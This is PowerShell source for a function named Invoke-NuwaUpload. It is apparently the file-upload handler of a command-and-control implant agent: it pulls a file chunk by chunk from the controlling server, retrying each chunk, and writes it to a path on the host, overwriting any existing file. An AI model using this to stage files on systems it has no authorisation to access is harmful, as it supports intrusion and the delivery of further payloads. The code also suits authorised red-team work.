function Invoke-NuwaUpload {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true)]
        [string]$TaskId,

        [Parameter(Mandatory = $true)]
        [hashtable]$Parameters
    )

    $targetPath = Resolve-NuwaPath -Path ([string]$Parameters.remote_path)
    $chunkSize = Get-NuwaFileChunkSize
    $chunkRequestAttempts = 3
    $chunkNumber = 1
    $totalChunks = 1

    if (Test-Path -LiteralPath $targetPath) {
        Remove-Item -LiteralPath $targetPath -Force
    }

    while ($chunkNumber -le $totalChunks) {
        $uploadResponse = $null
        for ($attempt = 0; $attempt -lt $chunkRequestAttempts; $attempt += 1) {
            $response = Invoke-NuwaSendMessage -Uuid $script:NuwaState.CallbackUUID -Action 'post_response' -Body @{
                responses = @(
                    @{
                        task_id = $TaskId
                        upload = @{
                            chunk_size = $chunkSize
                            file_id = [string]$Parameters.file
                            chunk_num = $chunkNumber
                            full_path = $targetPath
                        }
                    }
                )
            }

            $responseItems = $null
            if ($null -ne $response) {
                if ($response -is [hashtable]) {
                    if ($response.ContainsKey('responses')) {
                        $responseItems = $response.responses
                    }
                } else {
                    try {
                        $responseItems = $response.responses
                    } catch {
                        $responseItems = $null
                    }
                }
            }
            if ($responseItems -and @($responseItems).Count -gt 0) {
                $uploadResponse = @($responseItems)[0]
                $chunkData = $null
                if ($uploadResponse -is [hashtable]) {
                    if ($uploadResponse.ContainsKey('chunk_data')) {
                        $chunkData = $uploadResponse.chunk_data
                    }
                } else {
                    try {
                        $chunkData = $uploadResponse.chunk_data
                    } catch {
                        $chunkData = $null
                    }
                }
                $hasChunkData = Test-NuwaChunkDataPresent -Value $chunkData
                if ($hasChunkData) {
                    break
                }
                $uploadResponse = $null
            }

            if (($attempt + 1) -lt $chunkRequestAttempts) {
                Start-Sleep -Seconds 1
            }
        }
        if ($null -eq $uploadResponse) {
            throw ("Upload chunk request did not return chunk data for chunk {0}" -f $chunkNumber)
        }

        $totalChunks = [int]$uploadResponse.total_chunks
        $chunkBytes = ConvertFrom-NuwaChunkData -Value $uploadResponse.chunk_data
        if ($chunkNumber -eq 1) {
            Set-Content -LiteralPath $targetPath -Value $chunkBytes -Encoding Byte
        } else {
            Add-Content -LiteralPath $targetPath -Value $chunkBytes -Encoding Byte
        }
        $chunkNumber += 1
    }

    return @{
        completed = $true
        user_output = ("Uploaded file to {0}" -f $targetPath)
    }
}
